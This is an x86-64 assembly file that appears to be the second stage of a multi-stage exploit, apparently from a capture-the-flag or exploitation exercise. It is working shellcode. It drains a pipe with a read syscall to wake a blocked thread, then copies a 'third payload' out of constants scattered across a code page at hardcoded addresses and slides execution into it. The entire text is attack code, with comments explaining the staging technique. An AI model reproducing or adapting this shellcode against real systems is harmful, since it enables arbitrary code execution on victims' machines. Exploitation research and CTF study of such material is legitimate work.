[BITS 64]

;nop

; We need to wake up the other thread (sleeping trying to write to a pipe).
; Now that we allocate memory for it, we just need to read from the pipe.
; The pipe was created with O_DIRECT and a single 8K packet was written there.
; Therefore, reading one byte completely empties it.

xor rax, rax
mov al, 3
mov rdi, rax
mov rsi, rsp
xor rdx, rdx
inc rdx
xor rax, rax
syscall ; read


; we only have 80 bytes of shellcode for now
; we get the rest of the shellcode (third payload), by copying it from other constants in the code page

xor rax, rax
mov ebx, 0x10000b0 ; OTHERP
mov edx, 0x100175d ; GCODE

xor rcx, rcx

_copyloop:
mov eax, dword [rdx]
mov dword [rbx+rcx*4], eax
add edx, 11
inc rcx
cmp rcx, 50
jl _copyloop

; once the loop is completed we just "slide" into the third payload

